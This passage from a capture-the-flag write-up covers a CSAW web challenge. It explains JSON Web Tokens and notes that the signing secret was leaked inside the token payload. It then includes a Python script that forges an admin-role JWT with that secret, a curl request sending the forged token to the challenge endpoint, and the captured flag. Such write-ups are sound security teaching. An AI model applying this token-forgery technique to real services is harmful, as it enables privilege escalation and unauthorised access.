(I added `=` characters to the end of the second and third strings in order to make their lengths a multiple of 4, i.e. standard Base64 padding.)

The `JWT` bit is particularly interesting. JWT stands for [JSON Web Token](https://en.wikipedia.org/wiki/JSON_Web_Token), and is a simple format for issuing tokens from the server to the client that cannot easily be manipulated. The contents of the token are signed with a key only the server knows and the signature is attached to the token. If either changes, the token is rejected. But ... we have a `secret` value in the payload (the second part of the token)! Let's assume it is the signing key and forge the token such that our `type` is `admin` instead of `user`.

```python
import hmac
import hashlib
import base64

# the header is the same
headerData = b'{"alg":"HS256","typ":"JWT"}'
headerB64 = base64.b64encode(headerData, "-_").strip("=")

# modified payload
# - set the type to admin
# - remove the secret (why not)
# - extend the expiry timestamp
payloadData = b'{"type":"admin","iat":1537298018,"exp":1608495620}'
payloadB64 = base64.b64encode(payloadData, "-_").strip("=")

secret = "ufoundme!"
toDigest = bytes(headerB64 + "." + payloadB64)
signature = hmac.new(secret, toDigest, digestmod = hashlib.sha256).digest()
signatureB64 = base64.b64encode(signature, "-_").strip("=")

print ".".join([headerB64, payloadB64, signatureB64])
```

    $ python token.py
    eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWRtaW4iLCJpYXQiOjE1MzcyOTgwMTgsImV4cCI6MTYwODQ5NTYyMH0.ULVv8Amb2Ai1R57Sr3mPhtU9q-et4ttN2kudnoZrwl0

And with this modified token:

    $ curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWRtaW4iLCJpYXQiOjE1MzcyOTgwMTgsImV4cCI6MTYwODQ5NTYyMH0.ULVv8Amb2Ai1R57Sr3mPhtU9q-et4ttN2kudnoZrwl0" \
      "http://web.chal.csaw.io:9000/protected"

We get the flag!

`flag{JsonWebTokensaretheeasieststorage-lessdataoptiononthemarket!theyrelyonsupersecureblockchainlevelencryptionfortheirmethods}`
